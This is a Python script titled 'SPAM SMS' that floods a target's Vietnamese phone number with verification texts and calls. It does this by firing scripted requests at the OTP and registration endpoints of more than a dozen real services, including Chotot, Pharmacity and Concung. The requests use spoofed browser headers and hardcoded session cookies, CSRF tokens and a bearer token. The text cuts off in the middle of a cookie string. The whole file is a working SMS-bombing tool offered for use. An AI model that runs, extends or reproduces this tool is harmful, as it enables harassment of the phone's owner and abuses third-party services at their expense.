import requests
import os
import time
import re
import json
import sys
import argparse
from concurrent.futures import ThreadPoolExecutor
from os import name, system
os.system("color 0")
if name == 'nt':
    system("title SPAM SMS")
    system("mode 50, 31")

def banner():
    os.system("cls" if os.name == "nt" else "clear")
    ban = """
==============================
           SPAM SMS                
==============================              
"""
    for h in ban:
        sys.stdout.write(h)
        sys.stdout.flush()
        time.sleep(0.001)

# check định dạng sdt 
def validate_phone_number(sdt):
    pattern = r"^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$"
    return re.match(pattern, sdt)

# danh sách API spam
def regthantaioi(sdt):
  headers = {
    'Host': 'api.thantaioi.vn',
    #'content-length': '186',
    'accept-language': 'vi',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json',
    'accept': '*/*',
    'origin': 'https://thantaioi.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://thantaioi.vn/user/registration/reg1',
    #'accept-encoding': 'gzip, deflate, br'
}
  data = json.dumps(
  {"full_name":"Nguyễn Thanh Nam","first_name":"Nam","last_name":"Nguyễn","mobile_phone":"84"+sdt[1:],"target_url":"thantaioi.vn/?utm_source=google&utm_medium=organic&utm_campaign=organic"})
  response = requests.post('https://api.thantaioi.vn/api/user', data=data,headers=headers).json()
  
  global tokenthantaioi
  tokenthantaioi = response['token']
  print("|SPAM|THÀNH CÔNG|regthantaioi|")
def takomo(sdt):
  headers = {
    'Host': 'lk.takomo.vn',
    # 'content-length': '63',
    'accept': 'application/json, text/plain, */*',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://lk.takomo.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': '_gcl_au=1.1.1322990889.1691892176; _gid=GA1.2.1712469938.1691892180; _gat_UA-187725374-2=1; _hjFirstSeen=1; _hjIncludedInSessionSample_2281843=0; _hjSession_2281843=eyJpZCI6IjRkMTM2YmI3LWMwZTMtNDViYi04Y2RlLWVmZTEwMDNjOTcyMSIsImNyZWF0ZWQiOjE2OTE4OTIxODI5OTEsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _fbp=fb.1.1691892183149.361720121; _tt_enable_cookie=1; _ttp=rolXX5eW4teiY32zQW6AhD4vgnU; _fw_crm_v=c75bd27f-15ee-4b55-c659-dcb46da7d3e8; _hjSessionUser_2281843=eyJpZCI6IjBkZmZkMTM5LTdkYzYtNTQ1OS04Njg5LTNmYmMwZjg4YjIyNSIsImNyZWF0ZWQiOjE2OTE4OTIxODI5MTAsImV4aXN0aW5nIjp0cnVlfQ==; _ga_K15C064VTW=GS1.2.1691892186.1.1.1691892195.51.0.0; _cabinet_key=SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDMzODYwNzI0NQ.AuMP_7aZ-Nzl2IRO_r4s-uc-YPsmrSqJGHqyMw_WMQ8; _gat_UA-187725374-1=1; _ga=GA1.1.2029320197.1691892180; _ga_ZN0EBP68G5=GS1.1.1691892223.1.0.1691892224.59.0.0; _ga_ZBQ18M247M=GS1.1.1691892181.1.1.1691892225.16.0.0; _ga_03H0F9NHEX=GS1.2.1691892225.1.0.1691892226.59.0.0',
}
  data = '{"data":{"phone":"sdt","code":"resend","channel":"ivr"}}'.replace('sdt',sdt)
  response = requests.post('https://lk.takomo.vn/api/4/client/otp/send', headers=headers, data=data).text
  print("executortakomo|")
def bibabo(sdt):
  headers = {
    'Host': 'bibabo.vn',
    'Connection': 'keep-alive',
    # 'Content-Length': '64',
    'Accept': '*/*',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://bibabo.vn',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://bibabo.vn/user/signupPhone',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'Cookie': '_ui_bi_=eyJpdiI6IkZQNG9kOUZEVHdHRkw1cVBOOTF4Smc9PSIsInZhbHVlIjoibHpjZTlpbEhtN0VNVFhKNFwvS2V3XC85ZTIrUlwvNk5HYU1WdzRYeWpOdmhiaz0iLCJtYWMiOiI1NGQyZmM3NjE4MzE2NzQ3NGMyMjQ4M2FiZTBhN2E3M2EzZTJhMjM5NDJkMzcxZGU4OThiYWJhYmQ1YmFiYjAxIn0%3D; _gid=GA1.2.261767571.1691888491; mp_376a95ebc99b460db45b090a5936c5de_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A189ec699ad6ade-0cf9598c634b9f-1a203021-38400-189ec699ad7adf%22%2C%22%24device_id%22%3A%20%22189ec699ad6ade-0cf9598c634b9f-1a203021-38400-189ec699ad7adf%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%7D; _fbp=fb.1.1691888491341.1918851086; _gat=1; _ga=GA1.1.1813680014.1691888491; _ga_B05J0DJ8VM=GS1.1.1691888492.1.1.1691888493.0.0.0; gaVisitorUuid=cdea3535-e7d1-4fe7-823c-26aaab984e3d; XSRF-TOKEN=eyJpdiI6Iml6b1ROSUZXV1JoQWE5azFNRjRpYVE9PSIsInZhbHVlIjoicEhqODdzbUM1OUZhcW5jZmxzMVlmSjM2VmRVWE5PRTQ1ZE9RcEtub1ZybVJxZU9ZMCtyWGpKTnd2eFFGckJnV2NaWW5IdWpETTdMZWRxU1FHU3lmb3c9PSIsIm1hYyI6ImYwYTRiNTA2N2NjY2VjNDZmYTA1NGNlYzQxOGVjYTU5OWNhNTlmM2I4NmY1Mzc0MjQzNzUyMTNhM2VkOWMyNTYifQ%3D%3D; laravel_session=eyJpdiI6Im1IUUdLRGF0TjlpckljamkyS0ZxdEE9PSIsInZhbHVlIjoiV3JyaWduWmFxclNxcUUyK2FNSnZjMHFqOUJRd01cL1hWY2FcL09oNWtPZWVBUGVFM3VzV0lSSkYxQlREb1krQ1libUxjaXNZTlhqTmc0TnRwWlJjSVwvenc9PSIsIm1hYyI6IjkxZGMxOWRhZThlODMxNmUwMjM5MjBhNWRkY2I1MTA2MWFhNDEzYjllNTllMTEzMDUzNzhjZmM2NTJlOTBjNjgifQ%3D%3D',
}
  data = {
    'phone': f'{sdt}',
    '_token': '3ekXaZ227m0YVvU8gNY8U3XIBHDT2vTKABg5ZaBS',
}
  response = requests.post('https://bibabo.vn/user/verify-phone', headers=headers, data=data).text
  print("executorbibabo|")
def cashbar(sdt):
  headers = {
    'Host': 'api.cashbar.tech',
    # 'content-length': '73',
    'accept': 'application/json, text/plain, */*',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://h5.cashbar.work',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://h5.cashbar.work/',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
  }
  data = {
    'phone': f'{sdt}',
    'type': '2',
    'ctype': '1',
    'chntoken': '7f38e65de6b47136eaa373feade6cd33',
  }
  response = requests.post('https://api.cashbar.tech/h5/LoginMessage_ultimate', headers=headers, data=data).json()
  print("executorcashbar|")
def chotot(sdt):
  headers = {
    'Host': 'gateway.chotot.com',
    # 'content-length': '22',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json',
    'accept': '*/*',
    'origin': 'https://id.chotot.com',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://id.chotot.com/',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    
  }
  data = '{"phone":"sdt"}'.replace("sdt",sdt)
  response = requests.post('https://gateway.chotot.com/v2/public/auth/send_otp_verify', headers=headers, data=data).json()
  print("executorchotot|")
def pizzacompany(sdt):
  cookies = {
    '_gcl_au': '1.1.607819339.1691276885',
    '_ga': 'GA1.2.453948248.1691276886',
    '_gid': 'GA1.2.698696022.1691276886',
    '_tt_enable_cookie': '1',
    '_ttp': 'bwCYo8Ir1_CxxhKbysJDt5JtlQ7',
    '_fbp': 'fb.1.1691276888170.1960321660',
    '.Nop.Antiforgery': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdBq9So1BpAShECqnbe4x79hVD-kSPUOvSsZXdlopovNftYPw0l618PP3jBxWlS6DrW8ZwRFgYyfMxRk4LVDYk1oqhci4h4z6nxsio4sRCpVfQ5PDeD_cOZBqbvNqQrfl8',
    '.Nop.Customer': 'ccaefc12-aefb-4b4d-8b87-776f2ee9af1f',
    '.Nop.TempData': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdhAs4Uj_AWcS9nus5bsNq7oJeUYXskCpd7NOOmUhHC6O5SoOmOuoB3SPldKVFXv1Vb_1P3Dt9jKaGFxsnoiu6YyCICvW4HiUNIz8FLPxXRz1gRZofRDec2--_PkEYAHM914UlVbGNyajdpimnWw70-wpCHoT5hmruwLhFMTe_qew',
  }
  headers = {
    'Host': 'thepizzacompany.vn',
    # 'content-length': '199',
    'accept': '*/*',
    'x-requested-with': 'XMLHttpRequest',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://thepizzacompany.vn',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://thepizzacompany.vn/Otp',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': '_gcl_au=1.1.607819339.1691276885; _ga=GA1.2.453948248.1691276886; _gid=GA1.2.698696022.1691276886; _tt_enable_cookie=1; _ttp=bwCYo8Ir1_CxxhKbysJDt5JtlQ7; _fbp=fb.1.1691276888170.1960321660; .Nop.Antiforgery=CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdBq9So1BpAShECqnbe4x79hVD-kSPUOvSsZXdlopovNftYPw0l618PP3jBxWlS6DrW8ZwRFgYyfMxRk4LVDYk1oqhci4h4z6nxsio4sRCpVfQ5PDeD_cOZBqbvNqQrfl8; .Nop.Customer=ccaefc12-aefb-4b4d-8b87-776f2ee9af1f; .Nop.TempData=CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdhAs4Uj_AWcS9nus5bsNq7oJeUYXskCpd7NOOmUhHC6O5SoOmOuoB3SPldKVFXv1Vb_1P3Dt9jKaGFxsnoiu6YyCICvW4HiUNIz8FLPxXRz1gRZofRDec2--_PkEYAHM914UlVbGNyajdpimnWw70-wpCHoT5hmruwLhFMTe_qew',
  }
  data = {
    'phone': f'{sdt}',
    '__RequestVerificationToken': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMfbQwvToQkkGuj4TN2sRcEQ1WYLq8FZcCaAf8P9JHU46UhpBthj5H4JH3oJjwi0hx_zMAPEMRGPK6X6QnCzHwfMW_RhUnFUsBEDrss3f32LBDTUcbq9dohqqQZr2VFE9Ns',
  }
  response = requests.post('https://thepizzacompany.vn/customer/ResendOtp', cookies=cookies, headers=headers, data=data).json()
  print("executorpizzacompany|")
def onecredit(sdt):
  cookies = {
    'SN5c8116d5e6183': 'vd0peh2340qie49h8hksc6mktb',
    'OnCredit_id': '64cc576f3fcca5.61640209',
    'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef': '1eoY0fSNX4knqqaR+yewjR0dHrPCV8i0u+EA2ZEdAag=',
    '_fbp': 'fb.1.1691113338133.1121666643',
    'GN_USER_ID_KEY': '1b7eaaea-150b-4d8d-8250-69d546c1c1cb',
    '_ga_462Z3ZX24C': 'GS1.1.1691244602.2.1.1691244602.60.0.0',
    '_ga': 'GA1.2.148691698.1691113336',
    '_gid': 'GA1.2.1794411839.1691244604',
    '_gat_UA-139625802-1': '1',
    'GN_SESSION_ID_KEY': '43953d57-7d12-402f-ae07-ad1786e8ca8b',
    '_ga_4RZFMB042P': 'GS1.2.1691244607.2.0.1691244607.60.0.0',
  }
  headers = {
    'Host': 'oncredit.vn',
    # 'content-length': '231',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'x-requested-with': 'XMLHttpRequest',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://oncredit.vn',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://oncredit.vn/registration',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': 'SN5c8116d5e6183=vd0peh2340qie49h8hksc6mktb; OnCredit_id=64cc576f3fcca5.61640209; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=1eoY0fSNX4knqqaR+yewjR0dHrPCV8i0u+EA2ZEdAag=; _fbp=fb.1.1691113338133.1121666643; GN_USER_ID_KEY=1b7eaaea-150b-4d8d-8250-69d546c1c1cb; _ga_462Z3ZX24C=GS1.1.1691244602.2.1.1691244602.60.0.0; _ga=GA1.2.148691698.1691113336; _gid=GA1.2.1794411839.1691244604; _gat_UA-139625802-1=1; GN_SESSION_ID_KEY=43953d57-7d12-402f-ae07-ad1786e8ca8b; _ga_4RZFMB042P=GS1.2.1691244607.2.0.1691244607.60.0.0',
  } 
  params = {
    'ajax': '',
  }
  data = {
    'data[typeData]': 'sendCodeReg',
    'data[phone]': f'{sdt}',
    'data[email]': 'kdish12@gmail.com',
    'data[captcha1]': '1',
    'data[lang]': 'vi',
    'CSRFName': 'CSRFGuard_ajax',
    'CSRFToken': '59sZQFn8SF73FiA6bifZRTdRE2Eand5G77e93NDzfiKiRSH3Tbhe4tSdB3yHD2sf',
  }
  response = requests.post('https://oncredit.vn/', params=params, cookies=cookies, headers=headers, data=data).json()
  print("executoronecredit|")
def concung(sdt):
  cookies = {
    'PHPSESSID': 'ij419v9ov5ug09ui6t5v6hul56',
    '6f1eb01ca7fb61e4f6882c1dc816f22d': 'T%2FEqzjRRd5g%3DBpy7szeD03E%3DXv5zU4fvoPk%3DptVtroTCTyo%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DD94ivb5Cw3c%3Dr1OchLBIGPo%3Dc7XLOffW%2BH0%3Dc7gCysNyQxY%3DCNgWpQ5YeKY%3DD7U33jY70Ks%3D',
    '__utmc': '65249340',
    '__utmz': '65249340.1691112234.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)',
    '_ga': 'GA1.1.1576173301.1691112237',
    '_gcl_au': '1.1.601691012.1691112237',
    '_fbp': 'fb.1.1691112237077.759562086',
    '_tt_enable_cookie': '1',
    '_ttp': 'JyO6InY4cht34vkn0PUDBvJMCx5',
    '__utma': '65249340.412064474.1691112234.1691112234.1691138671.2',
    '__utmt': '1',
    'Srv': 'cc205|ZMy49|ZMy4w',
    '__utmb': '65249340.3.10.1691138671',
    '_ga_DFG3FWNPBM': 'GS1.1.1691138672.2.1.1691138724.8.0.0',
    '_ga_BBD6001M29': 'GS1.1.1691138674.2.1.1691138726.8.0.0',
  }
  headers = {
    'Host': 'concung.com',
    # 'content-length': '167',
    'accept': '*/*',
    'x-requested-with': 'XMLHttpRequest',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://concung.com',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://concung.com/dang-nhap.html',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': 'PHPSESSID=ij419v9ov5ug09ui6t5v6hul56; 6f1eb01ca7fb61e4f6882c1dc816f22d=T%2FEqzjRRd5g%3DBpy7szeD03E%3DXv5zU4fvoPk%3DptVtroTCTyo%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DD94ivb5Cw3c%3Dr1OchLBIGPo%3Dc7XLOffW%2BH0%3Dc7gCysNyQxY%3DCNgWpQ5YeKY%3DD7U33jY70Ks%3D; __utmc=65249340; __utmz=65249340.1691112234.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); _ga=GA1.1.1576173301.1691112237; _gcl_au=1.1.601691012.1691112237; _fbp=fb.1.1691112237077.759562086; _tt_enable_cookie=1; _ttp=JyO6InY4cht34vkn0PUDBvJMCx5; __utma=65249340.412064474.1691112234.1691112234.1691138671.2; __utmt=1; Srv=cc205|ZMy49|ZMy4w; __utmb=65249340.3.10.1691138671; _ga_DFG3FWNPBM=GS1.1.1691138672.2.1.1691138724.8.0.0; _ga_BBD6001M29=GS1.1.1691138674.2.1.1691138726.8.0.0',
  }
  data = {
    'ajax': '1',
    'classAjax': 'AjaxLogin',
    'methodAjax': 'sendOtpLogin',
    'customer_phone': f'{sdt}',
    'id_customer': '1',
    'static_token': 'e633865a31fa27f35b8499e1a75b0a76',
    'momoapp': '0',
    'back': 'khach-hang.html',
  }
  response = requests.post('https://concung.com/ajax.html',cookies=cookies, headers=headers,data=data).json()
  print("executorconcung|")
def y360(sdt):
  headers = {
    'Host': 'y360.vn',
    # 'content-length': '22',
    'accept': 'application/json',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json',
    'origin': 'https://y360.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://y360.vn/hoc/register',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': '_gcl_au=1.1.977893193.1691134633; _gid=GA1.2.1747107574.1691134633; _gat_gtag_UA_211029013_1=1; _fbp=fb.1.1691134636760.1633963715; _ga=GA1.1.329512893.1691134633; _ga_M7ZN50PQ1V=GS1.1.1691134632.1.1.1691134646.0.0.0; _ga_BS2V9QEV6V=GS1.1.1691134633.1.1.1691134667.0.0.0',
    }
  data = '{"phone":"sdt"}'.replace("sdt",sdt)
  response = requests.post('https://y360.vn/api/v1/user/register', data=data, headers=headers).json()
  global valuey360
  valuey360 = response['errors']
  print("executory360|")
def y360rs(sdt):
  headers = {
    'Host': 'y360.vn',
    # 'content-length': '689',
    'accept': 'application/json',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json',
    'origin': 'https://y360.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://y360.vn/hoc/register/code-verify/dbde2f96-3299-11ee-a400-0242ac150006',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': '_gcl_au=1.1.977893193.1691134633; _gid=GA1.2.1747107574.1691134633; _fbp=fb.1.1691134636760.1633963715; _gat_gtag_UA_211029013_1=1; _ga_M7ZN50PQ1V=GS1.1.1691134632.1.1.1691135104.0.0.0; _ga=GA1.1.329512893.1691134633; _ga_BS2V9QEV6V=GS1.1.1691134633.1.1.1691135122.0.0.0',
  }
  data = valuey360.encode()
  response = requests.post('https://y360.vn/api/v1/user/resendCode', data=data, headers=headers).json()
  print("|SPAM|THÀNH CÔNG|y360rs")
def phamacy(sdt):
  headers = {
    'Host': 'api-gateway.pharmacity.vn',
    # 'content-length': '36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json',
    'accept': '*/*',
    'origin': 'https://www.pharmacity.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://www.pharmacity.vn/',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
  }
  data = '{"phone":"sdt","referral":""}'.replace("sdt",sdt)
  response = requests.post('https://api-gateway.pharmacity.vn/customers/register/otp', data=data,headers=headers)
  print("|SPAM|THÀNH CÔNG|phamacy|")
def vayvnd(sdt):
  data = '{"phone":"sdt","utm":[{"utm_source":"google","utm_medium":"organic","referrer":"https://www.google.com/"}],"sourceSite":3}'.replace("sdt",sdt)
  head = {
    "Host":"api.vayvnd.vn",
    "accept":"application/json",
    "accept-language":"vi-VN",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "site-id":"3",
    "content-type":"application/json; charset=utf-8",
    "origin":"https://vayvnd.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://vayvnd.vn/",
    "accept-encoding":"gzip, deflate, br",
  }
  rq = requests.post("https://api.vayvnd.vn/v2/users",data=data,headers=head).json()
  print("|SPAM|THÀNH CÔNG|vayvnd|")
def ubofood(sdt):
  headers = {
    'Host': 'ubofood.com',
    'Connection': 'keep-alive',
    # 'Content-Length': '54',
    'Accept': 'application/json, text/plain, */*',
    'Cache-Control': 'no-cache',
    'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjM0MjM5OTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjM3OTc2MDAwMCJ9.QyAD_zWYVih-q10DAPQW_pCAvh7FDic4rpxgIubO3eqq9rvnzLmFUU3vm8NCRBB-ot4QO8EpyPu8VZ1RDALB7xOJqaUOzJ_sEWwNMZXr9Zl1DB8MsowoneZKq0IeQmF7AsWZ2nOCXQThVXCjDpdX6z0sfDUVbSBCvkoXKElFawG86Eo9VDFqGmR9W6abT8Y04wkeKSIAPc0N9dGUFTwmbjH3ihNWxsTwo2x_tavHlh8uvXR4Cl_qyewiUFaPkvn7joDEAQu04ub530yoge-zzlW2Dqjw0cfT1zH0QPqBS_bhtZQcJ0sxEfVgAHE9w5MIxPA6mSIBn6kGnZpaWa5vlNbxAEcZCAuprIRy9Ap-qIu6tmmlkPMTuOGPAWBaffWtkP28EV4xfNm9CQOTkGTZLKRo3o2YrT1HGm6na08kQZaBmmd5zCdSCDPC4X2xRH8BPpBs08oZfuORCVsWpCcwL_8pvaMbb4wwTEzfFkKAIjzXjFUu4B2Hq4ymNixu-mCcXmW5z5FC-Kzg4b2pUYuf7umoOLAnFVfNK_0j37gSYT0DeLdjWWyS5pZOCom-18XRoOnDhwhA_Dc0Emby-xX-BNiVSXvzderCWsGkffVKSv2NYiAEcVcobY9WvPAwSi-FAfCycO3X3RNb3zVoecfrpu6SCzkbK_atUotFNL_C3uU',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://ubofood.com',
    'X-Requested-With': 'mark.via.gp',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://ubofood.com/register',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'Cookie': '_gcl_au=1.1.1893195422.1691887985; _ga=GA1.1.920343154.1691887985; _tt_enable_cookie=1; _ttp=W3eMdboFrsZyxJg3xa7ZNN35ySW; _fbp=fb.1.1691887986713.850575362; ubo_trade=%7B%22code%22%3A%22379760000%22%2C%22name%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22email%22%3A%22%22%2C%22phone_number%22%3A%220828215656%22%2C%22address%22%3A%7B%22area%22%3A%7B%22code%22%3A%223%22%2C%22name%22%3A%22Mi%E1%BB%81n%20Nam%22%7D%2C%22city%22%3A%7B%22code%22%3A%2279%22%2C%22name%22%3A%22Th%C3%A0nh%20ph%E1%BB%91%20H%E1%BB%93%20Ch%C3%AD%20Minh%22%7D%2C%22district%22%3A%7B%22code%22%3A%22760%22%2C%22name%22%3A%22Qu%E1%BA%ADn%201%22%7D%2C%22ward%22%3A%7B%22code%22%3A%2226740%22%2C%22name%22%3A%22Ph%C6%B0%E1%BB%9Dng%20B%E1%BA%BFn%20Ngh%C3%A9%22%7D%2C%22text%22%3A%2206%20Th%C3%A1i%20V%C4%83n%20Lung%22%2C%22building%22%3A%22%22%2C%22floor%22%3A%22%22%2C%22apartment_no%22%3A%22%22%7D%2C%22discount%22%3A0%2C%22coordinate%22%3A%7B%22lat%22%3A10.778755%2C%22lng%22%3A106.70528%7D%2C%22status%22%3Atrue%2C%22created_at%22%3A%222022-10-15T08%3A24%3A02.2Z%22%2C%22updated_at%22%3A%222023-06-15T03%3A15%3A26.154Z%22%2C%22updated_by%22%3A%22anhltt%22%2C%22default_pos_code%22%3A%22379760001%22%7D; ubo_token=Bearer%20eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjM0MjM5OTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjM3OTc2MDAwMCJ9.QyAD_zWYVih-q10DAPQW_pCAvh7FDic4rpxgIubO3eqq9rvnzLmFUU3vm8NCRBB-ot4QO8EpyPu8VZ1RDALB7xOJqaUOzJ_sEWwNMZXr9Zl1DB8MsowoneZKq0IeQmF7AsWZ2nOCXQThVXCjDpdX6z0sfDUVbSBCvkoXKElFawG86Eo9VDFqGmR9W6abT8Y04wkeKSIAPc0N9dGUFTwmbjH3ihNWxsTwo2x_tavHlh8uvXR4Cl_qyewiUFaPkvn7joDEAQu04ub530yoge-zzlW2Dqjw0cfT1zH0QPqBS_bhtZQcJ0sxEfVgAHE9w5MIxPA6mSIBn6kGnZpaWa5vlNbxAEcZCAuprIRy9Ap-qIu6tmmlkPMTuOGPAWBaffWtkP28EV4xfNm9CQOTkGTZLKRo3o2YrT1HGm6na08kQZaBmmd5zCdSCDPC4X2xRH8BPpBs08oZfuORCVsWpCcwL_8pvaMbb4wwTEzfFkKAIjzXjFUu4B2Hq4ymNixu-mCcXmW5z5FC-Kzg4b2pUYuf7umoOLAnFVfNK_0j37gSYT0DeLdjWWyS5pZOCom-18XRoOnDhwhA_Dc0Emby-xX-BNiVSXvzderCWsGkffVKSv2NYiAEcVcobY9WvPAwSi-FAfCycO3X3RNb3zVoecfrpu6SCzkbK_atUotFNL_C3uU; _ga_KCGG79N4SY=GS1.1.1691887985.1.1.1691887993.0.0.0; 